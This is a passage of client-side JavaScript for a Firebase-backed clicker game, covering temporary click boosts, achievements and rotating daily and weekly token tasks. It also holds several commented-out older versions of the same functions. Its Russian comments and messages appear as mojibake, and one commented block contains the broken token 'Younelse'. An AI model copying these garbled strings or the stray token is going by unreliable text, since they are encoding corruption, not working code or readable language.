      tempBoostEndTime: boostEndTime,
      tempBoostOriginalClickPower: originalClickPower,
      tempBoostAmount: amount,
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏—è –±—É—Å—Ç–∞:", error);
    });
  }

  // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç–∞–π–º–µ—Ä –¥–ª—è –æ–∫–æ–Ω—á–∞–Ω–∏—è –±—É—Å—Ç–∞
  if (tempBoostTimeout) clearTimeout(tempBoostTimeout);
  tempBoostTimeout = setTimeout(() => {
    clickPower = originalClickPower;
    showMessage(`–ë—É—Å—Ç –∑–∞–∫–æ–Ω—á–∏–ª—Å—è: –°–∏–ª–∞ –∫–ª–∏–∫–∞ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞`);
    updateClickPowerBar();
    updateProfilePanel();
    submitScore();

    // –û—á–∏—â–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –±—É—Å—Ç–∞ –≤ Firebase
    if (user) {
      db.ref("leaderboard/" + user.uid).update({
        tempBoostActive: false,
        tempBoostEndTime: 0,
        tempBoostOriginalClickPower: 0,
        tempBoostAmount: 0,
        lastUpdate: Date.now()
      }).catch(error => {
        console.error("–û—à–∏–±–∫–∞ –æ—á–∏—Å—Ç–∫–∏ —Å–æ—Å—Ç–æ—è–Ω–∏—è –±—É—Å—Ç–∞:", error);
      });
    }
    tempBoostTimeout = null;
  }, duration);
}


  /*!!!  function boostClickPowerTemporarily(amount, duration) {
  // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –∞–∫—Ç–∏–≤–µ–Ω –ª–∏ –±—É—Å—Ç
  if (tempBoostTimeout && Date.now() < (tempBoostEndTime || 0)) {
    showMessage("–ë—É—Å—Ç —É–∂–µ –∞–∫—Ç–∏–≤–µ–Ω!");
    return;
  }

  originalClickPower = clickPower;
  const boosted = Math.min(clickPower + amount, 8);
  clickPower = boosted;

  const actualBoost = boosted - originalClickPower;
  showMessage(`–í—Ä–µ–º–µ–Ω–Ω—ã–π –±—É—Å—Ç: –°–∏–ª–∞ –∫–ª–∏–∫–∞ +${actualBoost} –Ω–∞ ${duration / 1000} —Å–µ–∫`);

  if (user) {
    tempBoostEndTime = Date.now() + duration; // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤—Ä–µ–º—è –æ–∫–æ–Ω—á–∞–Ω–∏—è –±—É—Å—Ç–∞
    db.ref("leaderboard/" + user.uid).update({
      tempBoostActive: true,
      tempBoostEndTime: tempBoostEndTime,
      tempBoostOriginalClickPower: originalClickPower,
      tempBoostAmount: amount,
      clickPower: clickPower, // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ç–µ–∫—É—â–µ–µ –∑–Ω–∞—á–µ–Ω–∏–µ clickPower
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏—è –±—É—Å—Ç–∞:", error);
    });
  }

  if (tempBoostTimeout) clearTimeout(tempBoostTimeout);
  tempBoostTimeout = setTimeout(() => {
    clickPower = originalClickPower;
    showMessage(`–ë—É—Å—Ç –∑–∞–∫–æ–Ω—á–∏–ª—Å—è: –°–∏–ª–∞ –∫–ª–∏–∫–∞ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞`);
    updateClickPowerBar();
    updateProfilePanel();
    submitScore();

    if (user) {
      db.ref("leaderboard/" + user.uid).update({
        tempBoostActive: false,
        tempBoostEndTime: 0,
        tempBoostOriginalClickPower: 0,
        tempBoostAmount: 0,
        clickPower: clickPower, // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ clickPower
        lastUpdate: Date.now()
      }).catch(error => {
        console.error("–û—à–∏–±–∫–∞ –æ—á–∏—Å—Ç–∫–∏ —Å–æ—Å—Ç–æ—è–Ω–∏—è –±—É—Å—Ç–∞:", error);
      });
    }
    tempBoostTimeout = null;
    tempBoostEndTime = 0;
  }, duration);
}!!!*/


    function toggleAchievements() {
      console.log("Calling toggleAchievements...");
      const panel = document.getElementById("achievementsPanel");
      if (!panel) {
        console.error("Element #achievementsPanel not found in toggleAchievements");
        return;
      }
      const btn = document.querySelector("button[onclick='toggleAchievements()']");
      if (!btn) {
        console.error("Button for toggleAchievements not found");
        return;
      }
      const isCurrentlyOpen = panel.classList.contains("open");
      console.log("Achievements panel is currently open:", isCurrentlyOpen);

      if (isCurrentlyOpen) {
        panel.classList.remove("open");
        btn.innerHTML = "üèÜ Achievements ‚ñº";
        console.log("Closing achievements panel");
      } else {
        closeAllPanels();
        panel.classList.add("open");
        btn.innerHTML = "üèÜ Achievements ‚ñ≤";
        console.log("Opening achievements panel");
        renderAchievements();
      }
    }

    function renderAchievements() {
      const list = document.getElementById('achievementsList');
      list.innerHTML = '';

      for (const key in allAchievements) {
        const achieved = achievements[key];
        const ach = allAchievements[key];

        const div = document.createElement('div');
        div.style.marginBottom = '10px';
        div.style.padding = '8px';
        div.style.border = '1px solid #00c3ff';
        div.style.borderRadius = '8px';
        div.style.backgroundColor = achieved ? '#00ffa6' : '#222';
        div.style.color = achieved ? '#000' : '#fff';
        div.innerHTML = `<strong>${ach.name}</strong><br>${ach.description}<br><em>${ach.reward}</em>`;
        list.appendChild(div);
      }
    }

    function updateClickPowerBar() {
      document.getElementById("clickPowerDisplay").innerText = clickPower;
      const progress = Math.min((clickPower / 8) * 100, 100);
      document.getElementById("clickPowerBar").style.width = progress + "%";
      updateClickPowerCostText();
    }

    function updateCounterDisplay() {
      document.getElementById("counter").innerText = `Tokens: ${score}`;
    }

    function showMessage(msg) {
      const el = document.getElementById("message");
      el.innerText = msg;
      setTimeout(() => el.innerText = '', 3000);
    }

function getWeekNumber() {
  const now = new Date();
  const startOfYear = new Date(now.getFullYear(), 0, 1);
  const pastDaysOfYear = (now - startOfYear) / 86400000;
  return Math.ceil((pastDaysOfYear + startOfYear.getDay() + 1) / 7);
}

  
    
    
/*!function renderTasks() {
  if (isRenderingTasks) return;
  isRenderingTasks = true;

  const list = document.getElementById("tasksList");
  list.innerHTML = "";

  if (!user) {
    isRenderingTasks = false;
    return;
  }

  db.ref(`tasks/${user.uid}`).once("value").then(snapshot => {
    const tasksData = snapshot.val() || {};
    const today = new Date().toDateString();
    const startOfWeek = new Date(new Date().setDate(new Date().getDate() - new Date().getDay() + (new Date().getDay() === 0 ? -6 : 1))).toDateString();

    dailyTasks.forEach(task => {
      let taskData = tasksData[task.id] || { progress: 0, lastReset: "", completions: 0, completed: false };

      const resetKey = task.period === "weekly" ? startOfWeek : today;
      if (taskData.lastReset !== resetKey) {
        taskData = { 
          progress: 0, 
          lastReset: resetKey, 
          completions: 0, 
          completed: false,
          ...(task.id === "collectTokens" && {
            goal: task.goalOptions[Math.floor(Math.random() * task.goalOptions.length)],
            reward: task.rewards[Math.floor(Math.random() * task.rewards.length)]
          })
        };
        db.ref(`tasks/${user.uid}/${task.id}`).set(taskData);
      }

      const div = document.createElement("div");
      if (taskData.completed || taskData.completions >= 1) {
        div.innerHTML = `${task.description}: Completed for ${task.period === "weekly" ? "this week" : "today"}!`;
      } else {
        if (task.id === "collectTokens") {
          div.innerHTML = `${task.description}: ${taskData.progress}/${taskData.goal} (Reward: ${taskData.reward} tokens)`;
        } else if (task.id === "subscribeTwitter") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward} tokens)
            <br>
           

          <a href="${task.link}" target="_blank" rel="noopener noreferrer" style="color: #00ffa6; text-decoration: none; cursor: pointer;" onclick="openTwitterLink('${task.link}'); return false;">Go to X</a>
            <button class="click-button" onclick="completeTwitterTask('${task.id}')" style="margin-left: 10px;">Claim</button>
          `;
        } else {
          div.innerHTML = `${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward})`;
        }
      }
      list.appendChild(div);
    });

    const validTaskIds = dailyTasks.map(task => task.id);
    for (const taskId in tasksData) {
      if (!validTaskIds.includes(taskId)) {
        db.ref(`tasks/${user.uid}/${taskId}`).remove();
      }
    }

    isRenderingTasks = false;
  }).catch(error => {
    console.error("Error rendering tasks:", error);
    showMessage("Failed to load tasks.");
    isRenderingTasks = false;
  });
}!*/

function renderTasks() {
  if (isRenderingTasks) return;
  isRenderingTasks = true;

  const list = document.getElementById("tasksList");
  list.innerHTML = "";

  if (!user) {
    isRenderingTasks = false;
    return;
  }

  db.ref(`tasks/${user.uid}`).once("value").then(snapshot => {
    const tasksData = snapshot.val() || {};
    const today = new Date().toDateString();
    const startOfWeek = new Date(new Date().setDate(new Date().getDate() - new Date().getDay() + (new Date().getDay() === 0 ? -6 : 1))).toDateString();
    const weekNumber = getWeekNumber();
    const isEvenWeek = weekNumber % 2 === 0;

    // –§–∏–ª—å—Ç—Ä—É–µ–º –∑–∞–¥–∞–Ω–∏—è —Å —É—á—ë—Ç–æ–º —á–µ—Ä–µ–¥–æ–≤–∞–Ω–∏—è
    const activeTasks = dailyTasks.filter(task => {
      if (!task.alternate) return true; // –û–±—ã—á–Ω—ã–µ –∑–∞–¥–∞–Ω–∏—è –≤—Å–µ–≥–¥–∞ –∞–∫—Ç–∏–≤–Ω—ã
      if (task.id === "autoclickerMaster" && isEvenWeek) return true; // autoclickerMaster –Ω–∞ —á—ë—Ç–Ω—ã—Ö –Ω–µ–¥–µ–ª—è—Ö
      if (task.id === "collectBigTokens" && !isEvenWeek) return true; // collectBigTokens –Ω–∞ –Ω–µ—á—ë—Ç–Ω—ã—Ö –Ω–µ–¥–µ–ª—è—Ö
      return false;
    });

    activeTasks.forEach(task => {
      let taskData = tasksData[task.id] || { progress: 0, lastReset: "", completions: 0, completed: false };

      const resetKey = task.period === "weekly" ? startOfWeek : today;
      if (taskData.lastReset !== resetKey) {
        taskData = { 
          progress: 0, 
          lastReset: resetKey, 
          completions: 0, 
          completed: false,
          ...(task.goalOptions && {
            goal: task.goalOptions[Math.floor(Math.random() * task.goalOptions.length)],
            reward: task.rewards[Math.floor(Math.random() * task.rewards.length)]
          })
        };
        db.ref(`tasks/${user.uid}/${task.id}`).set(taskData);
      }

      const div = document.createElement("div");
      if (taskData.completed || taskData.completions >= 1) {
        div.innerHTML = `${task.description}: Completed for ${task.period === "weekly" ? "this week" : "today"}!`;
      } else {
        if (task.id === "collectTokens" || task.id === "collectBigTokens") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${taskData.goal} (Reward: ${taskData.reward} tokens)
            <br>
            <button class="click-button" onclick="claimTask('${task.id}')" ${taskData.progress < taskData.goal ? 'disabled' : ''}>Claim</button>
          `;
        } else if (task.id === "subscribeTwitter") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward} tokens)
            <br>
            <a href="${task.link}" target="_blank" rel="noopener noreferrer" style="color: #00ffa6; text-decoration: none; cursor: pointer;" onclick="openTwitterLink('${task.link}'); return false;">Go to X</a>
            <button class="click-button" onclick="completeTwitterTask('${task.id}')" style="margin-left: 10px;">Claim</button>
          `;
        } else if (task.id === "clickMasterWeekly") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward} tokens)
            <br>
            <button class="click-button" onclick="claimTask('${task.id}')" ${taskData.progress < task.goal ? 'disabled' : ''}>Claim</button>
          `;
        } else {
          div.innerHTML = `${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward})`;
        }
      }
      list.appendChild(div);
    });

    const validTaskIds = activeTasks.map(task => task.id);
    for (const taskId in tasksData) {
      if (!validTaskIds.includes(taskId)) {
        db.ref(`tasks/${user.uid}/${taskId}`).remove();
      }
    }

    isRenderingTasks = false;
  }).catch(error => {
    console.error("Error rendering tasks:", error);
    showMessage("Failed to load tasks.");
    isRenderingTasks = false;
  });
}
    

/*!!!function renderTasks() {
  if (isRenderingTasks) return;
  isRenderingTasks = true;

  const list = document.getElementById("tasksList");
  list.innerHTML = "";

  if (!user) {
    isRenderingTasks = false;
    return;
  }

  db.ref(`tasks/${user.uid}`).once("value").then(snapshot => {
    const tasksData = snapshot.val() || {};
    const today = new Date().toDateString();
    const startOfWeek = new Date(new Date().setDate(new Date().getDate() - new Date().getDay() + (new Date().getDay() === 0 ? -6 : 1))).toDateString();

    dailyTasks.forEach(task => {
      let taskData = tasksData[task.id] || { progress: 0, lastReset: "", completions: 0, completed: false };

      const resetKey = task.period === "weekly" ? startOfWeek : today;
      if (taskData.lastReset !== resetKey) {
        taskData = { 
          progress: 0, 
          lastReset: resetKey, 
          completions: 0, 
          completed: false,
          ...(task.goalOptions && {
            goal: task.goalOptions[Math.floor(Math.random() * task.goalOptions.length)],
            reward: task.rewards[Math.floor(Math.random() * task.rewards.length)]
          })
        };
        db.ref(`tasks/${user.uid}/${task.id}`).set(taskData);
      }

      const div = document.createElement("div");
      if (taskData.completed || taskData.completions >= 1) {
        div.innerHTML = `${task.description}: Completed for ${task.period === "weekly" ? "this week" : "today"}!`;
      } else {
        if (task.id === "collectTokens" || task.id === "collectBigTokens") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${taskData.goal} (Reward: ${taskData.reward} tokens)
            <br>
            <button class="click-button" onclick="claimTask('${task.id}')" ${taskData.progress < taskData.goal ? 'disabled' : ''}>Claim</button>
          `;
        } else if (task.id === "subscribeTwitter") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward} tokens)
            <br>
            <a href="${task.link}" target="_blank" rel="noopener noreferrer" style="color: #00ffa6; text-decoration: none; cursor: pointer;" onclick="openTwitterLink('${task.link}'); return false;">Go to X</a>
            <button class="click-button" onclick="completeTwitterTask('${task.id}')" style="margin-left: 10px;">Claim</button>
          `;
        } else if (task.id === "clickMasterWeekly") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward} tokens)
            <br>
            <button class="click-button" onclick="claimTask('${task.id}')" ${taskData.progress < task.goal ? 'disabled' : ''}>Claim</button>
          `;
        } else {
          div.innerHTML = `${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward})`;
        }
      }
      list.appendChild(div);
    });

    const validTaskIds = dailyTasks.map(task => task.id);
    for (const taskId in tasksData) {
      if (!validTaskIds.includes(taskId)) {
        db.ref(`tasks/${user.uid}/${taskId}`).remove();
      }
    }

    isRenderingTasks = false;
  }).catch(error => {
    console.error("Error rendering tasks:", error);
    showMessage("Failed to load tasks.");
    isRenderingTasks = false;
  });
}!!!*/
    


  /*!!!! function renderTasks() {
  if (isRenderingTasks) return;
  isRenderingTasks = true;

  const list = document.getElementById("tasksList");
  list.innerHTML = "";

  if (!user) {
    isRenderingTasks = false;
    return;
  }

  db.ref(`tasks/${user.uid}`).once("value").then(snapshot => {
    const tasksData = snapshot.val() || {};
    const today = new Date().toDateString();
    const startOfWeek = new Date(new Date().setDate(new Date().getDate() - new Date().getDay() + (new Date().getDay() === 0 ? -6 : 1))).toDateString();

    dailyTasks.forEach(task => {
      let taskData = tasksData[task.id] || { progress: 0, lastReset: "", completions: 0, completed: false };

      const resetKey = task.period === "weekly" ? startOfWeek : today;
      if (taskData.lastReset !== resetKey) {
        taskData = { 
          progress: 0, 
          lastReset: resetKey, 
          completions: 0, 
          completed: false,
          ...(task.id === "collectTokens" && {
            goal: task.goalOptions[Math.floor(Math.random() * task.goalOptions.length)],
            reward: task.rewards[Math.floor(Math.random() * task.rewards.length)]
          })
        };
        db.ref(`tasks/${user.uid}/${task.id}`).set(taskData);
      }

      const div = document.createElement("div");
      if (taskData.completed || taskData.completions >= 1) {
        div.innerHTML = `${task.description}: Completed for ${task.period === "weekly" ? "this week" : "today"}!`;
      } else {
        if (task.id === "collectTokens") {
          div.innerHTML = `${task.description}: ${taskData.progress}/${taskData.goal} (Reward: ${taskData.reward} tokens)`;
        } else if (task.id === "subscribeTwitter") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward} tokens)
            <br>
            <a href="#" onclick="completeTwitterTask('${task.id}', '${task.link}'); return false;" style="background: linear-gradient(135deg, #00ffa6, #00c3ff); color: #000; padding: 8px 15px; border-radius: 8px; text-decoration: none; display: inline-block; margin: 5px; font-weight: bold; cursor: pointer;">Go to X</a>
          `;
        } else {
          div.innerHTML = `${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward})`;
        }
      }
      list.appendChild(div);
    });

    const validTaskIds = dailyTasks.map(task => task.id);
    for (const taskId in tasksData) {
      if (!validTaskIds.includes(taskId)) {
        db.ref(`tasks/${user.uid}/${taskId}`).remove();
      }
    }

    isRenderingTasks = false;
  }).catch(error => {
    console.error("Error rendering tasks:", error);
    showMessage("Failed to load tasks.");
    isRenderingTasks = false;
  });
} !!!!*/



function claimTask(taskId) {
  if (!user) {
    showMessage("Please sign in to complete tasks.");
    return;
  }

  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (taskData && (taskData.completed || taskData.completions >= 1)) {
      showMessage("Task already completed for this period!");
      return;
    }

    const goal = task.id === "collectTokens" || task.id === "collectBigTokens" ? taskData.goal : task.goal;
    if (taskData.progress >= goal) {
      const completions = (taskData.completions || 0) + 1;
      let reward = task.id === "collectTokens" || task.id === "collectBigTokens" ? taskData.reward : task.reward;

      score += reward;
      showMessage(`Task "${task.description}" completed! +${reward} tokens`);
      updateCounterDisplay();
      submitScore();

      db.ref(`tasks/${user.uid}/${task.id}`).set({
        progress: taskData.progress,
        lastReset: taskData.lastReset,
        completions: completions,
        completed: true,
        ...(task.id === "collectTokens" || task.id === "collectBigTokens" ? { goal: taskData.goal, reward: taskData.reward } : {})
      }).then(() => {
        renderTasks();
      }).catch(error => {
        console.error("Error completing task:", error);
        showMessage("Failed to complete task.");
      });
    } else {
      showMessage("Task not yet completed!");
    }
  }).catch(error => {
    console.error("Error fetching task data:", error);
    showMessage("Failed to fetch task data.");
  });
}
    

function completeTwitterTask(taskId) {
  if (!user) {
    showMessage("Please sign in to complete tasks.");
    return;
  }

  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (taskData && (taskData.completed || taskData.completions >= 1)) {
      showMessage("Task already completed for today!");
      return;
    }

    // –û—Ç–º–µ—á–∞–µ–º –∑–∞–¥–∞—á—É –∫–∞–∫ –≤—ã–ø–æ–ª–Ω–µ–Ω–Ω—É—é
    const completions = (taskData.completions || 0) + 1;
    db.ref(`tasks/${user.uid}/${taskId}`).set({
      progress: task.goal,
      lastReset: taskData.lastReset || new Date().toDateString(),
      completions: completions,
      completed: true
    }).then(() => {
      score += task.reward;
      showMessage(`Task "${task.description}" completed! +${task.reward} tokens`);
      updateCounterDisplay();
      submitScore();
      renderTasks();
    }).catch(error => {
      console.error("Error completing task:", error);
      showMessage("Failed to complete task.");
    });
  }).catch(error => {
    console.error("Error fetching task data:", error);
    showMessage("Failed to fetch task data.");
  });
}

   function openTwitterLink(url) {
  console.log("Attempting to open Twitter link: " + url);
  try {
    const newWindow = window.open(url, '_blank', 'noopener,noreferrer');
    if (newWindow) {
      console.log("New window opened successfully.");
      newWindow.focus();
    } else {
      console.error("Failed to open new window. Possible popup blocker.");
      showMessage("Unable to open X link. Please disable popup blocker or visit https://x.com/CircleGameTry manually.");
      setTimeout(() => {
        window.location.href = url;
      }, 1000);
    }
  } catch (error) {
    console.error("Error opening Twitter link: ", error);
    showMessage("Error opening X link. Redirecting to https://x.com/CircleGameTry...");
    setTimeout(() => {
      window.location.href = url;
    }, 1000);
  }
}  

    
/*!!function completeTwitterTask(taskId, url) {
  if (!user) {
    showMessage("Please sign in to complete tasks.");
    return;
  }

  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val() || { progress: 0, lastReset: "", completions: 0, completed: false };
    const task = dailyTasks.find(t => t.id === taskId);

    if (taskData.completed || taskData.completions >= 1) {
      showMessage("Task already completed for today!");
      // –í—Å—ë —Ä–∞–≤–Ω–æ –æ—Ç–∫—Ä—ã–≤–∞–µ–º —Å—Å—ã–ª–∫—É, –Ω–æ –Ω–µ –Ω–∞—á–∏—Å–ª—è–µ–º —Ç–æ–∫–µ–Ω—ã
      window.open(url, '_blank', 'noopener,noreferrer')?.focus();
      return;
    }

    // –û—Ç–∫—Ä—ã–≤–∞–µ–º –Ω–æ–≤–æ–µ –æ–∫–Ω–æ
    const newWindow = window.open(url, '_blank', 'noopener,noreferrer');
    if (!newWindow) {
      console.error("Failed to open new window. Possible popup blocker.");
      showMessage("Unable to open X link. Please disable popup blocker or visit the link manually.");
    } Younelse {
      newWindow.focus();
      console.log("Twitter link opened successfully.");
    }

    // –ó–∞—Å—á–∏—Ç—ã–≤–∞–µ–º –∑–∞–¥–∞—á—É
    const completions = (taskData.completions || 0) + 1;
    db.ref(`tasks/${user.uid}/${taskId}`).set({
      progress: task.goal,
      lastReset: taskData.lastReset || new Date().toDateString(),
      completions: completions,
      completed: true
    }).then(() => {
      score += task.reward;
      showMessage(`Task "${task.description}" completed! +${task.reward} tokens`);
      updateCounterDisplay();
      submitScore();
      renderTasks();
    }).catch(error => {
      console.error("Error completing task:", error);
      showMessage("Failed to complete task.");
    });
  }).catch(error => {
    console.error("Error fetching task data:", error);
    showMessage("Failed to fetch task data.");
    // –û—Ç–∫—Ä—ã–≤–∞–µ–º —Å—Å—ã–ª–∫—É –¥–∞–∂–µ –ø—Ä–∏ –æ—à–∏–±–∫–µ —Å –¥–∞–Ω–Ω—ã–º–∏
    window.open(url, '_blank', 'noopener,noreferrer')?.focus();
  });
}!!*/


  

    

    function toggleTasks() {
      const panel = document.getElementById("tasksPanel");
      const btn = document.querySelector("button[onclick='toggleTasks()']");
      const isCurrentlyOpen = panel.classList.contains("open");

      closeAllPanels();

      if (!isCurrentlyOpen) {
        panel.classList.add("open");
        btn.innerHTML = "üìã Tasks ‚ñ≤";
        renderTasks();
      }
    }

  /*!  function updateTaskProgress(taskId, increment) {
      if (!user) return;
      const now = new Date();
      const today = now.toDateString();
      // –ù–∞—á–∞–ª–æ —Ç–µ–∫—É—â–µ–π –Ω–µ–¥–µ–ª–∏
      const startOfWeek = new Date(now.setDate(now.getDate() - now.getDay() + (now.getDay() === 0 ? -6 : 1))).toDateString();
      
      const task = dailyTasks.find(t => t.id === taskId);
      const resetKey = task?.period === "weekly" ? startOfWeek : today;

      db.ref(`tasks/${user.uid}/${taskId}`).transaction(taskData => {
        taskData = taskData || { progress: 0, lastReset: resetKey, completions: 0, completed: false };
        if (taskData.lastReset !== resetKey) {
          taskData.progress = 0;
          taskData.lastReset = resetKey;
          taskData.completions = 0;
          taskData.completed = false;
        }
        if (taskData.completed || taskData.completions >= 1) {
          return taskData;
        }
        taskData.progress = (taskData.progress || 0) + increment;
        return taskData;
      }).then(() => {
        db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
          const taskData = snapshot.val();
          if (taskData && !(taskData.completed || taskData.completions >= 1)) {
            checkTaskCompletion(taskId);
          }
          renderTasks();
        });
      });
    }!*/


/*!!!    function updateTaskProgress(taskId, increment) {
  if (!user) return;

  const now = new Date();
  const today = now.toDateString();
  const startOfWeek = new Date(now.setDate(now.getDate() - now.getDay() + (now.getDay() === 0 ? -6 : 1))).toDateString();

  const task = dailyTasks.find(t => t.id === taskId);
  const resetKey = task?.period === "weekly" ? startOfWeek : today;

  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    let taskData = snapshot.val() || { progress: 0, lastReset: resetKey, completions: 0, completed: false };

    if (taskData.lastReset !== resetKey) {
      console.log(`Resetting task ${taskId}: new resetKey=${resetKey}`);
      taskData = {
        progress: 0,
        lastReset: resetKey,
        completions: 0,
        completed: false,
        ...(taskId === "collectTokens" && {
          goal: task.goalOptions[Math.floor(Math.random() * task.goalOptions.length)],
          reward: task.rewards[Math.floor(Math.random() * task.rewards.length)]
        })
      };
    }

    if (taskData.completed || taskData.completions >= 1) {
      console.log(`Task ${taskId} already completed for this period.`);
      return;
    }

    const newProgress = (taskData.progress || 0) + increment;
    const goal = taskId === "collectTokens" ? taskData.goal : task.goal;
    taskData.progress = Math.min(newProgress, goal);

    console.log(`Updating task ${taskId}: oldProgress=${taskData.progress - increment}, increment=${increment}, newProgress=${taskData.progress}, goal=${goal}`);

    db.ref(`tasks/${user.uid}/${taskId}`).set(taskData).then(() => {
      if (!(taskData.completed || taskData.completions >= 1)) {
        checkTaskCompletion(taskId);
      }
      renderTasks();
    }).catch(error => {
      console.error("Error updating task progress:", error);
      showMessage("Failed to update task progress.");
    });
  }).catch(error => {
    console.error("Error fetching task data:", error);
    showMessage("Failed to fetch task data.");
  });
}!!!*/

     function updateTaskProgress(taskId, increment) {
  if (!user) return;

  // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –∞–∫—Ç–∏–≤–Ω–æ –ª–∏ –∑–∞–¥–∞–Ω–∏–µ
  const weekNumber = getWeekNumber();
  const isEvenWeek = weekNumber % 2 === 0;
  const task = dailyTasks.find(t => t.id === taskId);
  if (task.alternate) {
    if (task.id === "autoclickerMaster" && !isEvenWeek) return;
    if (task.id === "collectBigTokens" && isEvenWeek) return;
  }

  const now = new Date();
  const today = now.toDateString();
  const startOfWeek = new Date(now.setDate(now.getDate() - now.getDay() + (now.getDay() === 0 ? -6 : 1))).toDateString();
  const resetKey = task?.period === "weekly" ? startOfWeek : today;

  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    let taskData = snapshot.val() || { progress: 0, lastReset: resetKey, completions: 0, completed: false };

    if (taskData.lastReset !== resetKey) {
      taskData = {
        progress: 0,
        lastReset: resetKey,
        completions: 0,
        completed: false,
        ...(task.goalOptions && {
          goal: task.goalOptions[Math.floor(Math.random() * task.goalOptions.length)],
          reward: task.rewards[Math.floor(Math.random() * task.rewards.length)]
        })
      };
    }

    if (taskData.completed || taskData.completions >= 1) {
      return;
    }

    const newProgress = (taskData.progress || 0) + increment;
    const goal = taskId === "collectTokens" || taskId === "collectBigTokens" ? taskData.goal : task.goal;
    taskData.progress = Math.min(newProgress, goal);

    db.ref(`tasks/${user.uid}/${taskId}`).set(taskData).then(() => {
      if (!(taskData.completed || taskData.completions >= 1)) {
        checkTaskCompletion(taskId);
      }
      renderTasks();
    }).catch(error => {
      console.error("Error updating task progress:", error);
      showMessage("Failed to update task progress.");
    });
  }).catch(error => {
    console.error("Error fetching task data:", error);
    showMessage("Failed to fetch task data.");
  });
} 





/*!function checkTaskCompletion(taskId) {
  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (taskData && (taskData.completed || (taskData.completions || 0) >= 1)) {
      return;
    }

    const goal = task.id === "collectTokens" ? taskData.goal : task.goal;
    if (taskData && taskData.progress >= goal) {
      const completions = (taskData.completions || 0) + 1;
      if (completions <= 1) {
        if (task.id === "clickMarathon") {
          score += task.reward;
          showMessage(`Task "${task.description}" completed! +${task.reward} tokens`);
          updateCounterDisplay();
          submitScore();
        } else if (task.id === "collectTokens") {
          score += taskData.reward;
          showMessage(`Task "${task.description}" completed! +${taskData.reward} tokens`);
          updateCounterDisplay();
          submitScore();
        } else if (task.id === "autoclickerMaster") {
          showMessage(`Task "${task.description}" completed! ${task.reward}`);
          startAutoclicker(300000, true);
          submitScore();
        }
        db.ref(`tasks/${user.uid}/${task.id}`).set({
          progress: 0,
          lastReset: taskData.lastReset,
          completions: completions,
          completed: true,
          ...(task.id === "collectTokens" && { goal: taskData.goal, reward: taskData.reward })
        });
      }
      renderTasks();
    }
  });
}!*/

  
function checkTaskCompletion(taskId) {
  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (taskData && (taskData.completed || (taskData.completions || 0) >= 1)) {
      return;
    }

    const goal = task.id === "collectTokens" || task.id === "collectBigTokens" ? taskData.goal : task.goal;
    if (taskData && taskData.progress >= goal) {
      const completions = (taskData.completions || 0) + 1;
      if (completions <= 1) {
        if (task.id === "clickMarathon" || task.id === "clickMasterWeekly") {
          score += task.reward;
          showMessage(`Task "${task.description}" completed! +${task.reward} tokens`);
          updateCounterDisplay();
          submitScore();
        } else if (task.id === "collectTokens" || task.id === "collectBigTokens") {
          // –ù–∞–≥—Ä–∞–¥–∞ –Ω–∞—á–∏—Å–ª—è–µ—Ç—Å—è —á–µ—Ä–µ–∑ claimTask
        } else if (task.id === "autoclickerMaster") {
          showMessage(`Task "${task.description}" completed! ${task.reward}`);
          startAutoclicker(300000, true);
          submitScore();
        }
        db.ref(`tasks/${user.uid}/${task.id}`).set({
          progress: taskData.progress,
          lastReset: taskData.lastReset,
          completions: completions,
          completed: true,
          ...(task.id === "collectTokens" || task.id === "collectBigTokens" ? { goal: taskData.goal, reward: taskData.reward } : {})
        });
      }
      renderTasks();
    }
  });
}

      
   /*! function clickToken() {
      score += clickPower;
      totalClicks++;
      updateTaskProgress("clickMarathon", 1);
      updateTaskProgress("levelUp", clickPower);
      checkAchievements();
      updateCounterDisplay();
      updateProfilePanel();
      animateCounter();
    }!*/

    function clickToken() {

